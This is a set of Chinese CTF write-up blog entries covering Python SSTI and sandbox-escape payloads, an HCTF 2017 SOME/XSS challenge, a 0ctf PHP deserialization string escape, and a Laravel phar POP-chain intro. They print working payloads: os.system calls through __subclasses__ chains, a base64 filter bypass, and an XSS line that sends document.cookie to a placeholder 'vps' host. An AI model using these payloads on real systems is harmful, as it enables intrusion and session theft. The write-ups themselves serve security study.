可以看出B.__bases__的结果是一个元祖，并且自上而下直到B自己的基类。那么__bases__[0]与__base__区别是什么呢？应该有很多人可以直接得出答案了吧？同样是上面那个例子，两者区别可以一眼看出 1234&gt;&gt;&gt; B.__bases__[0]&lt;class &apos;__main__.A&apos;&gt;&gt;&gt;&gt; B.__base__&lt;type &apos;type&apos;&gt; 再试试多继承,之前的例子 12345678&gt;&gt;&gt; class A(object): pass... &gt;&gt;&gt; class B(dict): pass... &gt;&gt;&gt; class C(A, B): pass... 1234&gt;&gt;&gt; C.__base__&lt;class &apos;__main__.B&apos;&gt;&gt;&gt;&gt; C.__bases__(&lt;class &apos;__main__.A&apos;&gt;, &lt;class &apos;__main__.B&apos;&gt;) 1.4.().__class__.__bases__[0].()__subclasses__[40] __subclasses__()每个类都保留一个对其直接子类的弱引用列表举两个例子12&gt;&gt;&gt; int.__subclasses__()[&lt;type &apos;bool&apos;&gt;] 12345678&gt;&gt;&gt; class Foo(object):... pass... &gt;&gt;&gt; class Bar(Foo):... pass... &gt;&gt;&gt; print Foo.__subclasses__()[&lt;class &apos;__main__.Bar&apos;&gt;] 12&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]&lt;type &apos;file&apos;&gt; 那么__subclasses__()其实的作用就是返回object的所有弱子类方法 1().__class__.__bases__[0].__subclasses__() 对于右边的[40]相信在看完3后应该都会比较了解了。 12&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]&lt;type &apos;file&apos;&gt; 1[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;__main__.Foo&apos;&gt;] ().__class__.__bases__[0].__subclasses__()[40]没错就是要返回file对象 需要提醒的是__subclasses__()方法返回的是一个列表 至于为什么要返回file对象，其实这里主要是看我们自己的需要的。 所以这里的思路就是1.通过__class__返回对应类型2.通过__bases__[0]返回基类object3.通过__subclasses__()方法找到我们需要的类 刚刚在找资料的时候发现有一篇cl0und@Syclover师傅的也总结的很好,同样也可以看看 https://xz.aliyun.com/t/2308#toc-7 1.5 Python 的内建函数在 Python 中，不引入直接使用的内置函数被成为 builtin 函数，我们可以通过可以通过dir __builtin__来获取内置函数列表 可以在python文档中查询python的内置方法 https://docs.python.org/2/library/stdtypes.html 所以我们 1dir(().__class__.__bases__[0].__subclasses__()[40]) 1[&apos;__class__&apos;, &apos;__delattr__&apos;, &apos;__doc__&apos;, &apos;__enter__&apos;, &apos;__exit__&apos;, &apos;__format__&apos;, &apos;__getattribute__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__iter__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;close&apos;, &apos;closed&apos;, &apos;encoding&apos;, &apos;errors&apos;, &apos;fileno&apos;, &apos;flush&apos;, &apos;isatty&apos;, &apos;mode&apos;, &apos;name&apos;, &apos;newlines&apos;, &apos;next&apos;, &apos;read&apos;, &apos;readinto&apos;, &apos;readline&apos;, &apos;readlines&apos;, &apos;seek&apos;, &apos;softspace&apos;, &apos;tell&apos;, &apos;truncate&apos;, &apos;write&apos;, &apos;writelines&apos;, &apos;xreadlines&apos;] 那么那么其实 1().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read() 这个payload的意思是 1file(r&apos;C:\1.php&apos;).read() 常见payload2我们再说说一些常见payload，虽然所从表面看我们大概能看出这些payload是用来干什么的但是一些细节可能还不是非常清楚 1234567python2：[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&apos;os.system(&quot;ls&quot;)&apos;) 123python3：&apos; &apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;]&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;] 2.1我们再讲下下面这个payload[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) 1[].__class__.__base__.__subclasses__() 对于前面这一段应该都比较清楚了 1234[].__class__.__base__.__subclasses__()[71]&lt;class &apos;site._Printer&apos;&gt;[].__class__.__base__.__subclasses__()[76]&lt;class &apos;site.Quitter&apos;&gt; 又有一个疑惑出来了这个&lt;class &#39;site._Printer&#39;&gt; &lt;class &#39;site.Quitter&#39;&gt; 是什么东西？？？为什么要引用这个类呢？ 对于site.xxx我个人是理解为引入此模块中的一些附加的内置函数。 其实这两段payload的目的是要引入import os模块 2.2 __init__.__globals__那么__init__.__globals__这又是什么意思呢？ __init____init__为控制的是类生成的对象，举个例子更好理解 12345678... def __init__(self,name):... self.name = name... print &quot;init&quot;... &gt;&gt;&gt; if __name__ == &apos;__main__&apos;:... user = User(&quot;test&quot;)... init __globals__函数名.__globals__对包含函数全局变量的字典进行引用，换句话说就是返回一个当前空间下能使用的模块，方法和变量的字典。 所以 1[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;] 这段其实就是为了导入os模块，至于为什么要导入os模块，os 模块提供了非常丰富的方法用来处理文件和目录。所以os模块的重要性不言而喻了吧？ 至于如何搜索哪个site.xx中有os模块这里提供一个脚本 我自己懒得重写了，来自bendawang师傅 http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/ 12345678910111213#!/usr/bin/env python# encoding: utf-8cnt=0for item in [].__class__.__base__.__subclasses__(): try: if &apos;os&apos; in item.__init__.__globals__: print cnt,item cnt+=1 except: print &quot;error&quot;,cnt,item cnt+=1 continue 最终会发现只有site.Quitter，与site._Printer中有os模块 12345...71 &lt;class &apos;site._Printer&apos;&gt;......76 &lt;class &apos;site.Quitter&apos; 3那么下面这个payload又是什么意思呢？ 1&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;) &quot;&quot;.__class__.__mro__[-1]毫无疑问也同样是要引入object对象 __mro__ 递归地显示父类一直到 object 12&apos;&apos;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;) 12&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[-1]&lt;type &apos;object&apos;&gt; 那么&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;__builtins__&#39;] 是什么意思呢？？？首先我们需要知道在 Python 中导入模块的方法通常有三种（xxx 为模块名称）： 1231. import xxx2. from xxx import *3. __import__(&apos;xxx&apos;) 当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。随着 builtin 这个模块自动引入到环境中。 其实这里的&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;]与__builtins__其实还是有所区别的 12&gt;&gt;&gt; __builtins__&lt;module &apos;__builtin__&apos; (built-in)&gt; 12&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;]&#123;&apos;bytearray&apos;: &lt;type &apos;bytearray&apos;&gt;, &apos;IndexError&apos;: &lt;type &apos;exceptions.IndexError&apos;&gt; ........... 对于__builtins__我们如何引入的模块呢？我们可以通过 dict 引入我们想要引入的模块。dict 的作用是列出一个模组 类 对象 下面 所有的属性和函数。实例： 12__builtins__.__dict__[&apos;__import__&apos;](&apos;os&apos;)&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt; 当然我们可以通过换种方式来绕过限制，比如使用base64加密 12345import base64&gt;&gt;&gt; base64.b64encode(&apos;__import__&apos;)&apos;X19pbXBvcnRfXw==&apos;&gt;&gt;&gt; base64.b64encode(&apos;os&apos;)&apos;b3M=&apos; 然后通过 dict 引用 1__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)) 毫无疑问&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;) 这段其实作用和之前的是一样的 这里我们同样讲解下evaleval()函数十分强大，官方demo解释为：将字符串str当成有效的表达式来求值并返回计算结果。但是如果滥用eval（）的话就会导致如果用户恶意输入，例如： __import__(&#39;os&#39;).system(&#39;dir&#39;) 4下一个payload &quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;) 12&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29]&lt;type &apos;builtin_function_or_method&apos;&gt; 对于__call__Python中的函数的引用可以作为输入传递到其他的函数/方法中，并在其中被执行。 这段的意思我认为是将(eval,’os.system(“ls”)’)作为内置函数执行 大概把想讲的都讲了吧 例题2SSTI in FlaskTokyoWesterns CTF 4th 2018 shrine详解 https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4 参考 https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.htmlhttps://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/https://www.freebuf.com/vuls/83999.htmlhttps://www.anquanke.com/post/id/85672https://xz.aliyun.com/t/52https://zhuanlan.zhihu.com/p/28823933https://juejin.im/post/5a0a458951882503dc5336c1https://www.evget.com/article/2015/8/28/22603.htmlhttps://hwhxy.github.io/ctf/2018/07/26/%E4%BB%8ECTF%E4%B8%AD%E5%AD%A6%E4%B9%A0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/http://cauc.me/2017/10/21/%E4%BB%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%B0%88%E8%B5%B7/https://www.k0rz3n.com/2018/10/04/Python%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%89/https://xz.aliyun.com/t/2308#toc-7http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>模板注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF 2017 Deserted place(SOME攻击)]]></title>
    <url>%2F2019%2F03%2F20%2FHCTF%202017%20Deserted%20place(SOME%E6%94%BB%E5%87%BB)%2F</url>
    <content type="text"><![CDATA[HCTF 2017 Deserted place(SOME攻击)注册并登入。发现change something中的message是可以进行self-xss的。一般这种题目是需要获取admin的cookie，那么我们该如何做到呢？首先列举下我们已知的条件。1.首先我们知道something中的message可以进行self-xss比如&lt;img src=&quot;1&quot; onerror=&quot;location=&#39;http://xxxx/&#39;%2bdocument.cookie&quot;&gt;， 2.其次我们能够发现以发现在change something 会执行一个edit（）函数，如下 1234567891011function edit()&#123; var newWin = window.open("./edit.php?callback=EditProfile",'','width=600,height=600'); var loop = setInterval(function() &#123; if(newWin.closed) &#123; clearInterval(loop); update(); &#125; &#125;, 1000);&#125;; 并且关闭窗口时候会执行update函数 1234567891011function update()&#123; var email = document.getElementById("email").innerHTML.substr(7); var message = document.getElementById("mess").innerHTML.substr(9); var csrftoken = document.getElementById("csrft").innerHTML.substr(11); var x = new XMLHttpRequest(); x.open('POST', './api/update.php', true); x.setRequestHeader("Content-type","application/x-www-form-urlencoded"); x.send('message='+message+'&amp;email='+email+'&amp;csrftoken='+csrftoken);&#125; 我们看看子窗口的源码，一旦关闭这个页面便会将内容传给父窗口 1234567891011121314151617181920212223function UpdateProfile()&#123; var username = document.getElementById('user').value; var email = document.getElementById('email').value; var message = document.getElementById('mess').value; window.opener.document.getElementById("email").innerHTML="Email: "+email; window.opener.document.getElementById("mess").innerHTML="Message: "+message; console.log("Update user profile success..."); window.close();&#125;function EditProfile()&#123; document.onkeydown=function(event)&#123; if (event.keyCode == 13)&#123; UpdateProfile(); &#125; &#125;&#125;function RandomProfile()&#123; setTimeout('UpdateProfile()', 1000);&#125; 整个流程大致意思是，修改子窗口的时候，关闭子窗口会将子窗口内容传给父窗口，并且子窗口有个jsonp的回调函数负责传递方法callback。 主页面中还有一个clickme 执行了random方法具体函数如下 12345678function random()&#123; var newWin = window.open("./edit.php?callback=RandomProfile",'','width=600,height=600'); var loop = setInterval(function() &#123; if(newWin.closed) &#123; clearInterval(loop); update(); &#125; &#125;, 1000); 而random方法又会执行RandomProfile，RandomProfile又会执行UpdateProfile 123function RandomProfile()&#123; setTimeout('UpdateProfile()', 1000);&#125; 这里我们需要使用some攻击首先我们在自己vps中创建两个页面1.html，2.html 1234567&lt;script&gt; function start_some() &#123; window.open("2.html"); location.replace("http://desert.2017.hctf.io/user.php"); &#125; setTimeout(start_some(), 1000);&lt;/script&gt; 123456&lt;script&gt; function attack() &#123; location.replace("http://desert.2017.hctf.io/edit.php?callback=RandomProfile&amp;user=xxx"); &#125; setTimeout(attack, 2000);&lt;/script&gt; xxx为自己创建的用户名字 然后在xxx用户的message写入payload 1&lt;img src=&quot;\&quot; onerror=window.location.href=&apos;http://vps?cookie=&apos;%2bdocument.cookie&gt; 使用report方法，使admin用户访问1.html，最终getflag 其实本身我对于some攻击其实还是不是非常了解小小的总结下Str3am师傅对其的解释（顺便也能够帮助我了解同源策略以及jsonp https://www.freebuf.com/articles/web/169873.html Some 攻击首先是要对于同源策略以及jsonp有所了解, https://www.someattack.com/Playground/About这是一个some攻击的靶场 1234567891011121314JSONP为一种用户可控制js执行函数的跨域数据访问技术正是由于JSONP可以控制执行函数的特性，产生了SOME攻击，（就比如说这题由于用户能够控callback中的函数所以导致了some攻击，这里主要涉及到一个jsonp的技术（我本身暂时还没有了解some攻击在目前我看来是一种xss的扩展，通过构造payload使得父页面以及子页面同源，使得子页面的domxss能够对父页面进行某种操作具体这个some攻击的产生原因我还没有特地深入了解其实我认为使用window.open产生的父页面以及子页面应该就算是同源了。但是在这题中admin打开的页面并非是自己的子页面所以需要在自己vps中构造payload使得它们同源（这里有个地方注意的是firefox与chrome已经禁止了window.open，可以使用iframe代替 参考 https://lorexxar.cn/2017/11/15/hctf2017-deserted-world/https://www.freebuf.com/articles/web/169873.html]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf_2016_unserialize(php反序列化逃逸字符)]]></title>
    <url>%2F2019%2F03%2F20%2F0ctf_2016_unserialize(php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6)%2F</url>
    <content type="text"><![CDATA[一.0ctf_2016_unserialize(php反序列化逃逸字符)1234知识点:* 代码审计* Unserialize* LFR www.Zip源码泄露获取源码 通过源码，我们可以发现在config.php中的flag，这题意图已经很明显了，是要我们读取config.php文件的内容。 1234567&lt;?php $config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;; $config[&apos;username&apos;] = &apos;root&apos;; $config[&apos;password&apos;] = &apos;&apos;; $config[&apos;database&apos;] = &apos;&apos;; $flag = &apos;&apos;;?&gt; 注册并登入，在cookie里发现bottle.session，说明很有可能这道题目是由Python的 bottle框架搭建的，与此同时在profile.php找到$profile = unserialize($profile);， $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));中包含有unserialize与file_get_contents，猜测这道题是需要利用unserialize反序列构造file_get_contents执行RCE。 12345$profile = unserialize($profile);$phone = $profile[&apos;phone&apos;];$email = $profile[&apos;email&apos;];$nickname = $profile[&apos;nickname&apos;];$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;])); 可以看到无论是file_get_contents($profile[&#39;photo&#39;])，还是unserialize($profile)都是通过$profile进行控制的，我们现在看看$profile变量能否被我们控制 123$username = $_SESSION[&apos;username&apos;];$profile=$user-&gt;show_profile($username);if($profile == null) &#123; 经过查找我们可以发现$profile 变量来源于show_profile方法，我们通过传入一个$username变量后引用了父类mysql的方法filter、select，最后返回了一个$object，而profile就是在这个$object变量中，让我看看mysql类中的函数 123456789101112131415161718192021222324252627282930313233343536373839 class user &#123; ... ... public function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &apos;$username&apos;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; ... ...&#125; class mysql &#123; private $link = null;...... public function select($table, $where, $ret = &apos;*&apos;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125;...... public function filter($string) &#123; $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;); $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;; $string = preg_replace($escape, &apos;_&apos;, $string); $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;); $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;; return preg_replace($safe, &apos;hacker&apos;, $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125; 这一连串代码作用已经很明显是要验证用户信息的。filter方法防止我们将会过滤符号\,\\字符串select,insert,update,delete。 经过寻找我们可以找到 $profile[&#39;photo&#39;]) 是源于update.php中 $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]); 1234567891011121314151617181920if(!preg_match(&apos;/^\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;])) die(&apos;Invalid phone&apos;);if(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;])) die(&apos;Invalid email&apos;);if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10) die(&apos;Invalid nickname&apos;);$file = $_FILES[&apos;photo&apos;];if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000) die(&apos;Photo size error&apos;);move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]); $user-&gt;update_profile($username, serialize($profile));echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;; 原本这段其实是没有问题的，关键是它先将$profile进行序列化后再进行存入数据库，而filter函数中会将where字符串转换成hacker，where是五个字符而hacker是六个字符，这样就给我提供了反序列化逃逸字符的条件 123456789public function filter($string) &#123; $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;); $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;; $string = preg_replace($escape, &apos;_&apos;, $string); $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;); $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;; return preg_replace($safe, &apos;hacker&apos;, $string);&#125; 反序列化逃逸字符 123456789&lt;?php //Enter your code here, enjoy!$profile[&apos;phone&apos;] = &apos;11115908609&apos;;$profile[&apos;email&apos;] = &apos;1049135811@qq.com&apos;;$profile[&apos;nickname&apos;] = &apos;aa&apos;;$profile[&apos;photo&apos;] = &apos;aaa&apos;;$a=serialize($profile);echo $a; 输出 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11115908609&quot;;s:5:&quot;email&quot;;s:17:&quot;1049135811@qq.com&quot;;s:8:&quot;nickname&quot;;s:2:&quot;aa&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125; 我们修改下 1$profile[&apos;nickname&apos;] = &apos;aa&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;&apos;; 输出 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11115908609&quot;;s:5:&quot;email&quot;;s:17:&quot;1049135811@qq.com&quot;;s:8:&quot;nickname&quot;;s:27:&quot;aa&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125; 因为多出&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;}于是我们可以hacker比where多的字符将其顶替,这里多处的字符用1代替比如这样 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11115908609&quot;;s:5:&quot;email&quot;;s:17:&quot;1049135811@qq.com&quot;;s:8:&quot;nickname&quot;;s:27:&quot;aa1111111111111111111111111&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:3:&quot;aaa&quot;;&#125; 最后得到同理我们可以将aaa换成我们想要的比如config.php就可以读出flag了,将得到的base64解码后的到flag 参考 http://blog.nsfocus.net/rpo-attack/https://lorexxar.cn/2018/01/02/34c3-writeup/#urlstoragehttp://www.yqxiaojunjie.com/index.php/archives/171/]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化之寻找pop链入门练习]]></title>
    <url>%2F2019%2F03%2F10%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AF%BB%E6%89%BEpop%E9%93%BE%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[前言本文不仅是对php反序列化Pop链的寻找，同时也是加深我对Laravel框架的理解 lumenserial本文基于本文以 code-breaking 中 lumenserial 为例，该题是基于Laravel框架搭建的，主要是看到安全客有一个师傅写了一篇关于这个的练习，感觉很不错，所以拿这题来练习。之前对于PHP框架只有稍微了解了下ThinkPHP有所了解，对这个框架第一印象是感觉这很像传统PHP框架和python框架的结合，之后看了下对于它源码的解析后才觉得这个框架有点牛逼。写这题也是提升自己对Laravel框架理解。题目地址: https://code-breaking.com/puzzle/7/ 更新P牛制作的docker环境(我觉得有点问题，但是修改了半天DockerFile文件还是不可以，不知道为什么) https://github.com/phith0n/code-breaking 利用 phar 拓展 php 反序列化漏洞攻击面 https://paper.seebug.org/680/ 一句话总结下Phar反序列就是构造个phar格式的文件里面有我们需要序列化的内容，这种格式它会自己序列化，然后通过一些可控的文件函数通过Phar：//xxx，去调用这个文件然后就反序列，具体看 http://www.lmxspace.com/2018/11/07/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Phar/https://blog.zsxsoft.com/post/38 其实对于这题来说 12345678910111213 protected function doCatchimage(Request $request) &#123;...... if ($sources) &#123; foreach ($sources as $url) &#123; $rets[] = $this-&gt;download($url); &#125; &#125;...... &#125; 123456789 private function download($url) &#123;...... $content = file_get_contents($url); $img = getimagesizefromstring($content);...... &#125; 在EditorController.php中有一个doCatchimage方法，可以传入一个数组变量$sources，调用download($url)方法,url 变量没有经过任何处理用在了 file_get_contents 函数中，不过貌似对于laravel框架还是有对函数进行过滤的，至于在哪里禁用的我找半天没找到，禁用了以下函数（好吧后来我看到别的师傅写道，这些信息通过 phpggc 的第一个 Laravel 框架 RCE 生成 phpinfo 函数的利用 phar 即可看到 12345disable_functions：system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_logdisable_classes：GlobIterator,DirectoryIterator,FilesystemIterator,RecursiveDirectoryIterator 我们可以使用phar进行反序列，构造如下代码进行利用，但是如何找到可利用的方法是一个难题。 1http://website/server/editor/?action=Catchimage&amp;source[]=phar://xxx.gif 可以通过PHPGGC寻找到Laravel框架RCE 的 4种payload 。我们稍微讲下其中一条Pop链，其他的应该类比就可以挖掘主要讲的是RCE1可以看到在PHPGGC中它是这样表示的。 其实七月火师傅已经讲的很清晰了，如果一下看不是非常明白，可以去多了解下Laravel框架，回头再看会清晰一些。 https://www.anquanke.com/post/id/170681 这张是来自七月火师傅，感觉没有这张图理解起来会比较困难 Pop链： 1.毫无疑问laravel框架的四个RCE都是从PendingBroadcast-&gt;__destruct()方法出去的， 以下均为我个人理解（目的是更好、好来更好理解laravel框架源码loc容器）：PendingBroadcast这个函数是laravel框架事件调用的具体类，并且通过BroadcastManager类注册PendingBroadcast进laravel框架loc容器中（BroadcastManager类继承了FactoryContract类） 